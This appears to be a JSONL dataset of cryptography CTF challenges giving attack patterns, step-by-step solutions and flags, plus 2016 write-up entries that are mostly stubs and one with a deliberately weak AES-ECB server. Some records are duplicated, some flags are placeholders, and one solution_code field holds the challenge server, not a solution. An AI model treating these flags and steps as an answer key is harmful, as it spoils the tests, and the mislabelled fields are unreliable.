{"challenge_name": "Convergent Cipher", "description": "Block cipher with 6-byte key and modular inverse S-box. Uses k0, k1, k2 derived from SHA256.", "attack_type": "Block Cipher", "category": "Block Cipher", "attack_pattern": "Differential Cryptanalysis", "solution_steps": ["Analyze cipher structure: modular inverse is the only non-linear component", "Identify vulnerability: Differential Cryptanalysis possible with 2 chose plaintexts", "Send PT1 = all zeros to get baseline", "Send PT2 = flip LSB of each half to get differential trace", "Compute XOR of ciphertexts to eliminate k2", "Perform parallel Meet-in-the-Middle search for k0 and k1 that satisfy the differential equation", "Recover full key and decrypt flag"], "flag": "FlagY{m33t_1n_th3_m1ddl3_0r_d1ff3r3n714l?}", "synthetic": false}
{"challenge_name": "Wesolowski VDF Challenge", "description": "Verifiable Delay Function challenge based on exponentiation modulo n. Server proves result = g^(2^T) and asks for h, pi such that h = pi^l * g^r.", "attack_type": "VDF", "category": "VDF", "attack_pattern": "Algebraic Attack", "solution_steps": ["Analyze verification equation: h % n == (pi^l * g^r) % n", "Observe server gives proof for 'result': result % n == (proof^l * g^r) % n", "Identify exploit: Protocol malleability allowing h = -result", "Set h = n - result (equivalent to -result mod n)", "Set pi = n - proof (equivalent to -proof mod n)", "Since l is an odd prime, (-proof)^l = -(proof^l), satisfying the equation", "Submit forged proof to retrieve flag"], "flag": "FlagY{Wesolowski's_VDF_is_less_secure_in_Fiat-Shamir!}", "synthetic": false}
{"challenge_name": "Quadratic CRT", "description": "CRT challenge over the ring of integers O of Q(sqrt(-7)). Flag encoded as flag*a where a=sqrt(-7). Given y1=x mod m1, y2=x mod m2.", "attack_type": "Number Theory", "category": "Number Theory", "attack_pattern": "Quadratic Field CRT", "solution_steps": ["Analyze that x = flag*a is purely imaginary in Q(sqrt(-7))", "Derive divisibility constraint: for m1|(c-d1)*a, need c \u2261 d1 (mod N(m1)/gcd(m1b, 7*m1a))", "Reduce problem from O-CRT to standard Z-CRT", "Apply Chinese Remainder Theorem over integers", "Extract flag coefficient c from the CRT solution", "Decode c as 64-byte big-endian integer"], "flag": "FlagY{qu4dr4t1c_1nt3g3rs_ar3_fun_abc360fd85fae6c0b1adf0d678ac41}", "synthetic": false}
{"challenge_name": "Ramson Multi-Layer Encryption", "description": "3-layer ransomware encryption: RSA (weak modulus), XOR with fixed key, ChaCha20 with known nonce.", "attack_type": "Multi-Layer Crypto", "category": "Multi-Layer Crypto", "attack_pattern": "Layer-by-layer Decryption", "solution_steps": ["Analyze encryption layers: RSA -> XOR -> ChaCha20", "Note RSA private key (d, n) is provided in source code", "Decrypt RSA: each ciphertext c maps to plaintext char via pow(c, d, n)", "Decode base64 to get XOR'd key bytes", "Reverse XOR with key '0x1337' (cycling pattern)", "Use recovered ChaCha20 key with provided nonce to decrypt flag"], "flag": "FlagY{Hybr!d_Encryp7i0n_Fl4g}", "synthetic": false}
{"challenge_name": "Leaky RSA Signatures", "description": "RSA with partial signatures s1, s2 for message 'an arbitrary message'. Standard Bellcore attack with SHA-256 hash.", "attack_type": "RSA", "category": "RSA", "attack_pattern": "Bellcore Fault Attack", "solution_steps": ["Identify partial signatures s1, s2 are CRT half-signatures", "Note that raw message doesn't work - try SHA-256 hash", "Compute m = SHA256(msg) as integer", "Calculate gcd(s1^e - m, n) to find factor p", "Factor n = p * q, compute phi and private key d", "Decrypt ciphertext c to recover flag"], "flag": "FlagY{f6fdd9f8ac38f5397731a3be3856c904}", "synthetic": false}
{"challenge_name": "Tux BMP XOR Encryption", "description": "BMP image encrypted with simple XOR cipher. Known BMP header enables key recovery.", "attack_type": "Classical Cipher", "category": "Classical Cipher", "attack_pattern": "Known Plaintext Attack", "solution_steps": ["Identify encrypted BMP file (tux.bmp.enc)", "Build expected BMP header (magic 'BM', file size, offsets)", "XOR encrypted header with expected header to derive key", "Identify key pattern repeats every 2 bytes (0xbd3a)", "Decrypt entire file with repeating 2-byte XOR key", "Visual flag may be embedded in image"], "flag": "Visual flag in decrypted image", "synthetic": false}
{"challenge_name": "Simple XOR Stream Encryption", "description": "Custom stream cipher: o[i+2] = ((key*o[i+1]) ^ (key+(o[i]*p))) % 2^128. Key is 64-bit secret.", "attack_type": "Stream Cipher", "category": "Stream Cipher", "attack_pattern": "Algebraic Key Recovery", "solution_steps": ["Analyze cipher structure: XOR of key*prev with key+prev2*char", "Set up Z3 constraint for first equation with known o[0], o[1], o[2]", "Add second equation constraint for o[3]", "Try common flag prefix 'Fl' to narrow key search", "Z3 solves for unique key = 17608713827523745640", "Brute-force each character position using forward encryption verification"], "flag": "FlagY{e4sy_3nc_3asy_d3c_a6cebdf01bf8a8feb61f}", "synthetic": false}
{"challenge_name": "Verilicious", "description": "RSA PKCS#1 v1.5 padding oracle. Given 78 multipliers r_i where verify(r_i^e * c) = 1, meaning m*r_i has valid padding (starts with 0x0002). This is an HNP instance.", "attack_type": "RSA/HNP", "category": "RSA/HNP", "attack_pattern": "Hidden Number Problem (HNP) via LLL", "solution_steps": ["Identify that valid PKCS#1 v1.5 padding means 2B <= r_i*m mod N < 3B where B = 2^(l-16)", "Reformulate as HNP: k_i - r_i*m + 2B \u2261 0 (mod N) where k_i < B are unknowns", "Build lattice M with N*I on top rows, r_i coefficients, and 2B offset", "Matrix has form: [N*I | 0; r_0..r_77, B/N, 0; 2B..2B, 0, B]", "Apply LLL to find short vector containing m*B/N in second-to-last column", "Extract m = row[-2] * N / B from target row (where row[-1] = -B)", "Note: Must append trivial r=1 to R list for sufficient samples"], "flag": "HTB{HNP_1s_t00_str0ng_h0n3stly___4ls0_ch3ck_l4st_p4g3_0f_https://eprint.iacr.org/2023/032.pdf}", "synthetic": false}
{"challenge_name": "Greatest Common Multiple", "description": "AES-GCM with nonce reuse. Get tags for variable AAD/CT, need to forge tag for empty inputs. Exploits GF(2^128) polynomial structure.", "attack_type": "AES-GCM", "category": "AES-GCM", "attack_pattern": "GCM Forbidden Attack (Nonce Reuse)", "solution_steps": ["Analyze: same (key, nonce) across all 'tag' queries = nonce reuse", "GCM tag = GHASH(H, A, C) XOR E(K, J0) where H = E(K, 0^128)", "Query multiple tags to get polynomial equations in H over GF(2^128)", "Use known AAD/CT structure: s[0], s[1] updated randomly via u1/u2 commands", "Collect enough tag samples to form overdetermined system for H", "Solve GCD of polynomials in GF(2^128) to recover authentication key H", "Forge tag for empty AAD/CT: tag = E(K, J0) = GHASH(H, '', '') XOR target", "Compute forged tag and submit"], "flag": "codegate2024{Is_it_normal_if_some_data_is_obtainable_just_with_tag?...F_2^128's_super_property}", "synthetic": false}
{"challenge_name": "Quo vadis?", "description": "Given point in tower extension R1 = Z/2^k Z extended by irreducible polynomials. Must find isomorphic point in single-degree extension R2. Sage required.", "attack_type": "Finite Fields", "category": "Finite Fields", "attack_pattern": "Field Isomorphism Computation", "solution_steps": ["Parse tower extension R1 built from sequence of irreducible polynomials", "Parse single extension R2 with degree = product of R1 degrees", "Both fields are isomorphic: R1 \u2245 R2 (same cardinality)", "Construct explicit isomorphism \u03c6: R1 \u2192 R2 by finding root of defining poly", "Map given point pt1 \u2208 R1 to pt2 = \u03c6(pt1) \u2208 R2", "Submit pt2 coordinates, receive evaluation of same polynomial", "Repeat for each challenge, collect K values to derive AES key"], "flag": "ECSC{1s0m0rph1sms_w1th_0ur_0ld_fr13nd_Evariste_8beb83d57fb48ea1}", "synthetic": false}
{"challenge_name": "One Round Crypto", "description": "Custom cipher with 12 mixing rounds + keyed S-box + 12 more mixing rounds. Must decrypt 100 random ciphertexts to get flag.", "attack_type": "Block Cipher", "category": "Block Cipher", "attack_pattern": "Cipher Structure Inversion", "solution_steps": ["Analyze cipher: enc = mix(sub(mix(msg, key1), key2), key3)", "Note key derivation is deterministic: key_i = sha256^i(key)", "mix() uses PRNG seeded with current_key - fully deterministic once key known", "sub() is keyed S-box: S[i][(x + key[i]) % 256] - invertible", "First query: encrypt known plaintext to learn encryption behavior", "Observe 100 random ciphertexts and decrypt each by inverting cipher", "Invert: unmix -> unsub -> unmix (reversing PRNG order)", "Submit all 100 plaintexts correctly to receive flag"], "flag": "ECSC{d035_7h15_d3570y35_ASA?!_c25976c15c535a3d}", "synthetic": false}
{"challenge_name": "Verilicious", "description": "RSA PKCS#1 v1.5 padding oracle. Given 78 multipliers r_i where verify(r_i^e * c) = 1, meaning m*r_i has valid padding (starts with 0x0002). This is an HNP instance.", "attack_type": "RSA/HNP", "category": "RSA/HNP", "attack_pattern": "Hidden Number Problem (HNP) via LLL", "solution_steps": ["Identify that valid PKCS#1 v1.5 padding means 2B <= r_i*m mod N < 3B where B = 2^(l-16)", "Reformulate as HNP: k_i - r_i*m + 2B \u2261 0 (mod N) where k_i < B are unknowns", "Build lattice M with N*I on top rows, r_i coefficients, and 2B offset", "Matrix has form: [N*I | 0; r_0..r_77, B/N, 0; 2B..2B, 0, B]", "Apply LLL to find short vector containing m*B/N in second-to-last column", "Extract m = row[-2] * N / B from target row (where row[-1] = -B)", "Note: Must append trivial r=1 to R list for sufficient samples"], "flag": "HTB{HNP_1s_t00_str0ng_h0n3stly___4ls0_ch3ck_l4st_p4g3_0f_https://eprint.iacr.org/2023/032.pdf}", "synthetic": false}
{"challenge_name": "Greatest Common Multiple", "description": "AES-GCM with nonce reuse. Get tags for variable AAD/CT, need to forge tag for empty inputs. Exploits GF(2^128) polynomial structure.", "attack_type": "AES-GCM", "category": "AES-GCM", "attack_pattern": "GCM Forbidden Attack (Nonce Reuse)", "solution_steps": ["Analyze: same (key, nonce) across all 'tag' queries = nonce reuse", "GCM tag = GHASH(H, A, C) XOR E(K, J0) where H = E(K, 0^128)", "Query multiple tags to get polynomial equations in H over GF(2^128)", "Use known AAD/CT structure: s[0], s[1] updated randomly via u1/u2 commands", "Collect enough tag samples to form overdetermined system for H", "Solve GCD of polynomials in GF(2^128) to recover authentication key H", "Forge tag for empty AAD/CT: tag = E(K, J0) = GHASH(H, '', '') XOR target", "Compute forged tag and submit"], "flag": "codegate2024{Is_it_normal_if_some_data_is_obtainable_just_with_tag?...F_2^128's_super_property}", "synthetic": false}
{"challenge_name": "Quo vadis?", "description": "Given point in tower extension R1 = Z/2^k Z extended by irreducible polynomials. Must find isomorphic point in single-degree extension R2. Sage required.", "attack_type": "Finite Fields", "category": "Finite Fields", "attack_pattern": "Field Isomorphism Computation", "solution_steps": ["Parse tower extension R1 built from sequence of irreducible polynomials", "Parse single extension R2 with degree = product of R1 degrees", "Both fields are isomorphic: R1 \u2245 R2 (same cardinality)", "Construct explicit isomorphism \u03c6: R1 \u2192 R2 by finding root of defining poly", "Map given point pt1 \u2208 R1 to pt2 = \u03c6(pt1) \u2208 R2", "Submit pt2 coordinates, receive evaluation of same polynomial", "Repeat for each challenge, collect K values to derive AES key"], "flag": "ECSC{1s0m0rph1sms_w1th_0ur_0ld_fr13nd_Evariste_8beb83d57fb48ea1}", "synthetic": false}
{"challenge_name": "One Round Crypto", "description": "Custom cipher with 12 mixing rounds + keyed S-box + 12 more mixing rounds. Must decrypt 100 random ciphertexts to get flag.", "attack_type": "Block Cipher", "category": "Block Cipher", "attack_pattern": "Cipher Structure Inversion", "solution_steps": ["Analyze cipher: enc = mix(sub(mix(msg, key1), key2), key3)", "Note key derivation is deterministic: key_i = sha256^i(key)", "mix() uses PRNG seeded with current_key - fully deterministic once key known", "sub() is keyed S-box: S[i][(x + key[i]) % 256] - invertible", "First query: encrypt known plaintext to learn encryption behavior", "Observe 100 random ciphertexts and decrypt each by inverting cipher", "Invert: unmix -> unsub -> unmix (reversing PRNG order)", "Submit all 100 plaintexts correctly to receive flag"], "flag": "ECSC{d035_7h15_d3570y35_ASA?!_c25976c15c535a3d}", "synthetic": false}
{"challenge_name": "XOR-CBC", "description": "Custom XOR-CBC mode where the block cipher is just XOR with key. IV prepended to ciphertext. Flag starts with 'RTACTF{'. Block size 8 bytes.", "attack_type": "Symmetric/XOR", "category": "Symmetric/XOR", "attack_pattern": "XOR Known-Plaintext Attack", "solution_steps": ["Analyze cipher: C\u2080 = IV \u2295 P\u2080 \u2295 KEY (primitive is LINEAR XOR, not AES)", "Note known prefix: 'RTACTF{' (7 bytes) + 1 unknown byte = 8-byte first block", "Bruteforce last byte of P\u2080 (256 attempts)", "For each candidate P\u2080, compute KEY = IV \u2295 P\u2080 \u2295 C\u2080", "Decrypt entire message with candidate KEY", "Validate: result starts with 'RTACTF{' and ends with '}'"], "flag": "RTACTF{1_b0ugh7_4_b1k3_y3s73rd4y}", "synthetic": false}
{"challenge_name": "Size-Limit RSA", "description": "RSA challenge where N, e, c AND d (private key) are all provided. Flag assertion: len(flag) == 131 bytes, but N is only 128 bytes (1024 bits). Size mismatch vulnerability.", "attack_type": "RSA", "category": "RSA", "attack_pattern": "Direct RSA Decryption", "solution_steps": ["Observe that d (private key) is given directly - trivial decryption", "Compute m = pow(c, d, N) and convert to bytes", "Note: 131-byte flag > 128-byte modulus = information loss if m \u2265 N", "Verify d is correct by factoring N using e*d-1 approach", "Add leading null bytes to reach 131 bytes if needed", "Result is binary - may indicate corrupted challenge data or special encoding"], "flag": "[Binary output - challenge may have corrupted data]", "synthetic": false}
{"challenge_name": "A-Fact-of-CTF", "description": "Custom encoding: ct = \u220f primes[i]^(ord(flag[i])) where primes are all primes < 300. Flag length \u2264 62 chars. Name hints at factorization.", "attack_type": "Number Theory", "category": "Number Theory", "attack_pattern": "Prime Power Factorization", "solution_steps": ["Analyze encoding: each character's ASCII value becomes exponent of unique prime", "First prime (2) encodes first char, second prime (3) encodes second, etc.", "Factorize ct by trial division with known primes list", "For each prime p_i, count exponent e_i = ord(flag[i])", "Convert: chr(e_i) reconstructs each character", "Stop when exponent becomes 0 (end of flag)"], "flag": "Alpaca{prime_factorization_solves_everything}", "synthetic": false}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\0ctf-2016\\crypto\\arsenal-8", "year": "2016", "name": "arsenal-8", "writeup": "# 0CTF : arsenal-8\n\n**Category:** Crypto\n**Points:** 8\n**Solves:** 2\n**Description:**\n\n> There is a rumor that Arsenal F.C., Talent Yang's favourite team, always likes to set some \"mission impossible\" tasks for themselves.\n>\n> For instance, with a 0-2 home defeat against FC Barcelona they must play a great game in Camp Nou to get to the next round of UEFA Champions League. Can they fulfil this task? Decrypt the provided ciphertext to help them!\n>\n>\n> (The executable of this challenge is similar to that of People's Square , check the slight difference and enjoy solving it)\n>\n>\n> You should perform 2^32 single round decryption first\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\0ctf-2016\\crypto\\equation-2", "year": "2016", "name": "equation-2", "writeup": "# 0CTF : equation-2\n\n**Category:** Crypto\n**Points:** 2\n**Solves:** 44\n**Description:**\n\n> Here is a RSA private key with its upper part masked. Can your recover the private key and decrypt the file?\n\n\n## Write-up\n\nWe are given the following picture of a fragment of the RSA private key.\n\n![Private Key Fragment](https://github.com/p4-team/ctf/blob/master/2016-03-12-0ctf/equation/mask.png?raw=true)\n\nwhich displays the following bse64 string:\n\n```\nOs9mhOQRdqW2cwVrnNI72DLcAXpXUJ1HGwJBANWiJcDUGxZpnERxVw7s0913WXNtV4GqdxCzG0pG5EHThtoTRbyX0aqRP4U/hQ9tRoSoDmBn+3HPITsnbCy67VkCQBM4xZPTtUKM6Xi+16VTUnFVs9E4rqwIQCDAxn9UuVMBXlX2Cl0xOGUF4C5hItrX2woF7LVS5EizR63CyRcPovMCQQDVyNbcWD7N88MhZjujKuSrHJot7WcCaRmTGEIJ6TkU8NWt9BVjR4jVkZ2EqNd0KZWdQPukeynPcLlDEkIXyaQx\n```\n\nIn order to determine what information we have and what we don't, we need to figure out the structure through which the components of an RSA Private key are encoded. I began with a Google search for `RSA private key encoding`, and was able to establish these keys are encoded under the ISO (International Standards Organization) standard [`Abstract Syntax Notation One (ASN.1)`](https://en.wikipedia.org/wiki/Abstract_Syntax_Notation_One#Example_encoded_in_DER). The same Google results show RSA private keys (and most cryptographics) use a specific syntax form named [`Distinguished Encoding Rules (DER)`](https://en.wikipedia.org/wiki/X.690#DER_encoding). In order to ascertain the specific structure of RSA private keys, I made a second Google search: `ANS1 DER RSA private key structure`. One of the first results was [this page](https://tls.mbed.org/kb/cryptography/asn1-key-structures-in-der-and-pem) which sounded promising. Scrolling down two thirds of the page shows me this code block:\n\n```\n-----BEGIN RSA PRIVATE KEY-----\nBASE64 ENCODED DATA\n-----END RSA PRIVATE KEY-----\n```\nLook familiar? And right below it, I am shown the structure of the RSA private key:\n\n```\nRSAPrivateKey ::= SEQUENCE {\n  version           Version,\n  modulus           INTEGER,  -- n\n  publicExponent    INTEGER,  -- e\n  privateExponent   INTEGER,  -- d\n  prime1            INTEGER,  -- p\n  prime2            INTEGER,  -- q\n  exponent1         INTEGER,  -- d mod (p-1)\n  exponent2         INTEGER,  -- d mod (q-1)\n  coefficient       INTEGER,  -- (inverse of q) mod p\n  otherPrimeInfos   OtherPrimeInfos OPTIONAL\n}\n```\n\nRemember we said the string of text from the image was base64? Well to be able to pull the components from the data, we need to convert it to the computer's most basic encoding; binary. This is what we get:\n\n```\n00111010 11001111 01100110 10000100 11100100 00010001 01110110 10100101 10110110 01110011 00000101 01101011 10011100 11010010 00111011 11011000 00110010 11011100 00000001 01111010 01010111 01010000 10011101 01000111\n00011011 00000010 01000001 00000000 11010101 10100010 00100101 11000000 11010100 00011011 00010110 01101001\n10011100 01000100 01110001 01010111 00001110 11101100 11010011 11011101 01110111 01011001 01110011 01101"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\0ctf-2016\\crypto\\peoples-square-6", "year": "2016", "name": "peoples-square-6", "writeup": "# 0CTF : peoples-square-6\n\n**Category:** Crypto\n**Points:** 6\n**Solves:** 12\n**Description:**\n\n> People's Square (A.K.A. shenmhin guangshan in Shanghai Dialect) is a large public square in the Huangpu District of Shanghai, China.\n>\n> We know Talent Yang is the king of People's Square. Now he provides you a strange guessing game, and he also demonstrates his talent by giving you the result of how he tackles this task. Can you show your talent to decrypt the secret?\n>\n>\n> file\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/peoples_square)\n"}
{"source": "write-ups-2016", "category": "RSA", "path": "data\\write-ups-2016\\0ctf-2016\\crypto\\rsa-2", "year": "2016", "name": "rsa-2", "writeup": "# 0CTF : rsa-2\n\n**Category:** Crypto\n**Points:** 2\n**Solves:** 32\n**Description:**\n\n> It seems easy, right?\n>\n> Tip: openssl rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc\n>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/rsa)\n"}
{"source": "write-ups-2016", "category": "XOR", "path": "data\\write-ups-2016\\0ctf-2016\\misc\\xor-painter-4", "year": "2016", "name": "xor-painter-4", "writeup": "# 0CTF : xor-painter-4\n\n**Category:** Misc\n**Points:** 4\n**Solves:** 11\n**Description:**\n\n> you need a BIG screen to solve this problem xor_painter_8e926de10c2ac8b7c6be05580f7b6972.zip\n>\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [P4 Team](https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/xorpainter)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\33c3-ctf\\crypto\\beeblebrox-350", "year": "2016", "name": "beeblebrox-350", "writeup": "# 33c3 CTF : beeblebrox-350\n\n**Category:** Crypto\n**Points:** 350\n**Solves:** 9\n**Description:**\n\n[Make bad politicians resign](beeblebrox.tar.xz)!\n\n\tnc 78.46.224.72 2048\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://galhacktictrendsetters.wordpress.com/2017/01/04/33c3-ctf-beeblebrox/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\33c3-ctf\\crypto\\ichnixwisse-250", "year": "2016", "name": "ichnixwisse-250", "writeup": "# 33c3 CTF : ichnixwisse-250\n\n**Category:** Crypto\n**Points:** 250\n**Solves:** 12\n**Description:**\n\nSomebody told me graph coloring is hard. He didn't believe me that I have the perfect algorithm to solve the problem, so we devised a [clever protocol](ichnixwisse.tar.xz) to prove it to him.\n\n\tnc 78.46.224.68 4444\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://galhacktictrendsetters.wordpress.com/2017/01/04/33c3-ctf-ichnixwisse/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\33c3-ctf\\crypto\\smartfridge2-75", "year": "2016", "name": "smartfridge2-75", "writeup": "# 33c3 CTF : smartfridge2-75\n\n**Category:** Crypto\n**Points:** 75\n**Solves:** 34\n**Description:**\n\nYour flatmate told you about this delicious yoghurt that he has put into his shelf. Unfortunately you do not know his pin code. However, you [recorded](smartfridge2.pcap) the last time he interacted with the refrigerator. Can you take his yoghurt?\n\nThe server is the same as for smartfridge1.\n\nNote: this challenge is rate limited\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* https://piggybird.net/2016/12/33c3-ctf-smartfridge2-writeup-crypto-75/\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\3dsctf-2016\\crypto\\crypto-200", "year": "2016", "name": "crypto-200", "writeup": "# 3DS CTF 2016 : crypto-200\n\n**Category:** 3Dsctf-2016\n**Points:** \n**Solves:** \n**Description:**\n\n> We have intercepted data being leaked from our network, some data is readable other is crypted. Are you able to decrypt and uncover the flag?  Recovered Files. public.key unbreakable.py flags.txt\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\3dsctf-2016\\crypto\\crypto-master-100", "year": "2016", "name": "crypto-master-100", "writeup": "# 3DS CTF 2016 : crypto-master-100\n\n**Category:** 3Dsctf-2016\n**Points:** \n**Solves:** \n**Description:**\n\n> John says that he is the master of his personal server. He created a script that talks to him as if it was his disciple. The problem is that in order to access the server, one needs to know the logic used by the script. Access the server and get the flag. Server: 54.175.35.248:8002 \n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\3dsctf-2016\\crypto\\hot-sun-100", "year": "2016", "name": "hot-sun-100", "writeup": "# 3DS CTF 2016 : hot-sun-100\n\n**Category:** 3Dsctf-2016\n**Points:** \n**Solves:** \n**Description:**\n\n> Surfing in the Shallowweb, we have discovered a new algorithm that promises to be the newest substituition cipher. The algorithm to encrypt works as following: the user informs the text to be encrypted and a number N. Initially, the algorithm shift all letters one position to the right (e.g. 'A' tuns into 'B'). With this result, in the next step, the algorithm now shift the text two positions to the right. And with the text from the previous output, it repeats the shift procedure until N. Your task is quite simple: given an encrypted flag and an N number, discover the flag.  Encrypted flag: 3RG{hv1g_f0h_1g_b0h_g0_V0h} N: 11\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\3dsctf-2016\\crypto\\hue-crypto-200", "year": "2016", "name": "hue-crypto-200", "writeup": "# 3DS CTF 2016 : hue-crypto-200\n\n**Category:** 3Dsctf-2016\n**Points:** \n**Solves:** \n**Description:**\n\n> We have a particular way of laughing online in Brazil. But maybe you have valuable information on that laugh.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\3dsctf-2016\\crypto\\x-in-verona-300", "year": "2016", "name": "x-in-verona-300", "writeup": "# 3DS CTF 2016 : x-in-verona-300\n\n**Category:** 3Dsctf-2016\n**Points:** \n**Solves:** \n**Description:**\n\n> Agent X, a member of a notorious hacker team, got a message from his contact. Your task if you decide to accept, is decrypt the message and grab the flag. Clock is ticking. Attached message.\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\3dsctf-2016\\stego\\crypto-coding-200", "year": "2016", "name": "crypto-coding-200", "writeup": "# 3DS CTF 2016 : crypto-coding-200\n\n**Category:** 3Dsctf-2016\n**Points:** \n**Solves:** \n**Description:**\n\n> There are various scientific experiments that search for extraterrestrial intelligence. One of the most famous projects analyze all collected radio signals that came from space looking for any intelligent signal. Without any success until now, the Third Department of Surveilence discovered a strange file that received a strong radio signal when it was recorded and could have some important information. Can you retrieve that?\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\abctf-2016\\crypto\\a-small-broadcast-125", "year": "2016", "name": "a-small-broadcast-125", "writeup": "# ABCTF 2016 : a-small-broadcast-125\n\n**Category:** Crypto\n**Points:** 125\n**Solves:** 69\n**Description:**\n\nI RSA encrypted the same message 3 different times with the same exponent. Can you decrypt this?\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Kimiyuki Onaka](https://kimiyuki.net/blog/2016/07/23/abctf-2016/)\n* [RawSec](https://rawsec.ml/en/ABCTF-125-A-Small-Broadcast-Cryptography/)\n* [ATX 2600](https://ctftime.org/writeup/3618)\n"}
{"source": "write-ups-2016", "category": "AES", "path": "data\\write-ups-2016\\abctf-2016\\crypto\\aes-mess-75", "year": "2016", "name": "aes-mess-75", "writeup": "# ABCTF 2016 : aes-mess-75\n\n**Category:** Crypto\n**Points:** 75\n**Solves:** 182\n**Description:**\n\nWe encrypted a flag with AES-ECB encryption using a secret key, and got the hash: e220eb994c8fc16388dbd60a969d4953f042fc0bce25dbef573cf522636a1ba3fafa1a7c21ff824a5824c5dc4a376e75\nHowever, we lost our plaintext flag and also lost our key and we can't seem to decrypt the hash back :(.\nLuckily we encrypted a bunch of other flags with the same key. Can you recover the lost flag using this?\n\n[HINT] There has to be some way to work backwards, right?\n\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Kimiyuki Onaka](https://kimiyuki.net/blog/2016/07/23/abctf-2016/)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\abctf-2016\\crypto\\ceasar-salad-10", "year": "2016", "name": "ceasar-salad-10", "writeup": "# ABCTF 2016 : ceasar-salad-10\n\n**Category:** Crypto\n**Points:** 10\n**Solves:** 685\n**Description:**\n\n\nMost definitely the best salad around. Can you decrypt this for us?\nxyzqc{t3_qelrdeq_t3_k33a3a_lk3_lc_qe3p3}\n\n## Write-up\n\nA simple Ceasar-Chiffre, just rotate the characters and check for anything that's making sense...\n\nThe flag format was abctf{FLAG} which gives us a rotation of -3:\n\n    abctf{w3_thought_w3_n33d3d_on3_of_th3s3}\n\n## Other write-ups and resources\n\n* [RawSec](https://rawsec.ml/en/ABCTF-10-Caesar-Salad-Cryptography/)\n* [Kimiyuki Onaka](https://kimiyuki.net/blog/2016/07/23/abctf-2016/)\n* [OMECA](https://github.com/nbrisset/CTF/tree/master/abctf-2016/challenges/caesar-salad-10)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\abctf-2016\\crypto\\custom-authentication-160", "year": "2016", "name": "custom-authentication-160", "writeup": "# ABCTF 2016 : custom-authentication-160\n\n**Category:** Crypto\n**Points:** 160\n**Solves:** 44\n**Description:**\n\nI just learned about encryption and tried to write my own authentication system. Can you get in? Here(404) is the source! And here is the site.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [ATX 2600](https://ctftime.org/writeup/3620)\n* [P_TE](https://p-te.fr/2016/07/23/abctf-custom-authentication/)\n"}
{"source": "write-ups-2016", "category": "crypto", "path": "data\\write-ups-2016\\abctf-2016\\crypto\\encryption-service-140", "year": "2016", "name": "encryption-service-140", "writeup": "# ABCTF 2016 : encryption-service-140\n\n**Category:** Crypto\n**Points:** 140\n**Solves:** 74\n**Description:**\n\nSee if you can break this!!\nYou can connect with nc 107.170.122.6 7765 and the source can be found here.\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* [Kimiyuki Onaka](https://kimiyuki.net/blog/2016/07/23/abctf-2016/)\n* [ATX 2600](https://ctftime.org/writeup/3622)\n* [Ray Doyle](https://www.doyler.net/security-not-included/ecb-chosen-plaintext-attack)\n* [P_TE](https://p-te.fr/2016/07/23/abctf-encryption-service/)\n", "solution_code": "\n# UTkSDn4H.py\n#/usr/bin/env python\nfrom Crypto.Cipher.AES import AESCipher\n\nimport SocketServer,threading,os,time\nimport signal\n\nfrom secret2 import FLAG, KEY\n\nPORT = 7765\n\ndef pad(s):\n  l = len(s)\n  needed = 16 - (l % 16)\n  return s + (chr(needed) * needed)\n\ndef encrypt(s):\n  return AESCipher(KEY).encrypt(pad('ENCRYPT:' + s.decode('hex') + FLAG))\n\nclass incoming(SocketServer.BaseRequestHandler):\n    def handle(self):\n        atfork()\n        req = self.request\n\n        def recvline():\n            buf = \"\"\n            while not buf.endswith(\"\\n\"):\n                buf += req.recv(1)\n            return buf\n        signal.alarm(5)\n\n        req.sendall(\"Send me some hex-encoded data to encrypt:\\n\")\n        data = recvline()\n        req.sendall(\"Here you go:\")\n        req.sendall(encrypt(data).encode('hex') + '\\n')\n        req.close()\n\nclass ReusableTCPServer(SocketServer.ForkingMixIn, SocketServer.TCPServer):\n  pass\n\nSocketServer.TCPServer.allow_reuse_address = True\nserver = ReusableTCPServer((\"0.0.0.0\", PORT), incoming)\n\nprint \"Server listening on port %d\" % PORT\nserver.serve_forever()"}
